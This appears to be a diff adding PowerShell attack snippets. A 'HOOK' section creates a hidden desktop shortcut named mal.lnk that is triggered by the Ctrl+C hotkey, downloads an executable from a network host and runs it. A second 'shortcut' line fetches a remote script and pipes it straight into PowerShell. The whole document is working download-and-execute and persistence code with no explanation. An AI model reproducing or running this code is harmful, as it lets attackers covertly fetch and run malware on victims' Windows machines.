@@ -1,0 +1,18 @@
+
+---------------------HOOK---------------------------------
+
+$malLoc = $home + "\Desktop\mal.lnk"
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($malLoc)
+$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+$Shortcut.Arguments = "/c powershell.exe Invoke-webRequest -Uri 'http://192.168.1.109/putty.exe' -OutFile %tmp%\\file.exe; start %tmp%//file.exe"
+$Shortcut.hotkey = 'CTRL+C'
+$Shortcut.WindowStyle = 7
+$Shortcut.Save()
+attrib +h $malLoc
+
+
+----------------FIRST FILE SHORTCUT ----------------------
+
+C:\Windows\System32\cmd.exe /k powershell.exe  ""(Invoke-WebRequest ""http://192.168.1.109/mal.txt"").Content | powershell""
+
